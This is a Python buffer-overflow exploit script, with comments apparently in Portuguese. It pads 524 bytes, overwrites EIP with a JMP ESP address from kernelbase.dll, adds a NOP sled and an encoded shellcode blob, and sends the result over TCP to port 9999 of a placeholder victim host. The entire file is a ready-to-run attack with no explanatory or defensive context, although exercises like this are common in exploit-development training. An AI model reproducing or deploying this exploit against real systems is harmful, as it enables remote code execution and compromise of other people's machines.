import socket

#501 bytes
overflow = "A" * 524
eip = "\xf3\x12\x17\x31" # 311712f3 JMP ESP (kernellbase.dll)

#shellcode
buf =  b""
buf += b"\xda\xce\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x59\xba\x93"
buf += b"\xa8\xa1\xe7\x83\xc0\x04\x31\x50\x15\x03\x50\x15\x71"
buf += b"\x5d\x5d\x0f\xfa\x9e\x9e\xd0\x64\x16\x7b\xe1\xb6\x4c"
buf += b"\x0f\x50\x06\x06\x5d\x59\xed\x4a\x76\xea\x83\x42\x47"
buf += b"\x13\x6c\x24\xed\xcd\x43\x8a\x5e\x2d\xc2\x76\x9d\x62"
buf += b"\x24\x46\x6e\x77\x25\x8f\x38\xfd\xca\x5d\x30\xaf\x04"
buf += b"\x35\xcd\x12\x18\xb8\x01\x19\x20\xc2\x24\xde\xd4\x7e"
buf += b"\x26\x0f\x44\xf4\x70\x8f\xef\x42\x99\xce\x3c\xd7\x50"
buf += b"\xa4\xfe\xe9\x9d\x0c\x75\x3d\xe9\x8e\x5f\x0f\x2d\x3c"
buf += b"\x9e\xbf\xa0\x3c\xe7\x78\x5b\x4b\x13\x7b\xe6\x4c\xe0"
buf += b"\x01\x3c\xd8\xf6\xa2\xb7\x7a\xd2\x53\x1b\x1c\x91\x58"
buf += b"\xd0\x6a\xfd\x7c\xe7\xbf\x76\x78\x6c\x3e\x58\x08\x36"
buf += b"\x65\x7c\x50\xec\x04\x25\x3c\x43\x38\x35\x98\x3c\x9c"
buf += b"\x3e\x0b\x2a\xa0\xbf\xd3\x53\xfc\x57\x1f\x9e\xff\xa7"
buf += b"\x37\xa9\x8c\x95\x98\x01\x1b\x95\x51\x8c\xdc\xac\x76"
buf += b"\x2f\x32\x16\x16\xd1\xb3\x66\x3e\x16\xe7\x36\x28\xbf"
buf += b"\x88\xdd\xa8\x40\x5d\x4b\xa3\xd6\x9e\x23\xb2\x2f\x77"
buf += b"\x31\xb5\x2e\x3c\xbc\x53\x60\x12\xee\xcb\xc1\xc2\x4e"
buf += b"\xbc\xa9\x08\x41\xe3\xca\x32\x88\x8c\x61\xdd\x64\xe4"
buf += b"\x1d\x44\x2d\x7e\xbf\x89\xf8\xfa\xff\x02\x08\xfa\x4e"
buf += b"\xe3\x79\xe8\xa7\x94\x81\xf0\x37\x31\x81\x9a\x33\x93"
buf += b"\xd6\x32\x3e\xc2\x10\x9d\xc1\x21\x23\xda\x3e\xb4\x15"
buf += b"\x90\x09\x22\x19\xce\x75\xa2\x99\x0e\x20\xa8\x99\x66"
buf += b"\x94\x88\xca\x93\xdb\x04\x7f\x08\x4e\xa7\x29\xfc\xd9"
buf += b"\xcf\xd7\xdb\x2e\x50\x28\x0e\x2d\x97\xd6\xcc\x1a\x30"
buf += b"\xbe\x2e\x1b\xc0\x3e\x45\x9b\x90\x56\x92\xb4\x1f\x96"
buf += b"\x5b\x1f\x48\xbe\xd6\xce\x3a\x5f\xe6\xda\x9b\xc1\xe7"
buf += b"\xe9\x07\xf2\x92\x82\xb8\xf3\x62\x8b\xdc\xf4\x62\xb3"
buf += b"\xe2\xc9\xb4\x8a\x90\x0c\x05\xa9\xab\x3b\x28\x98\x21"
buf += b"\x43\x7e\xda\x63"

print ("[+] Iniciado")
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("ipdavitima", 9999))
print ("[+] Conectado")
sock.sendall(overflow + eip + "\x90" * 15 + buf)
sock.close()

print ("[+] Enviado")
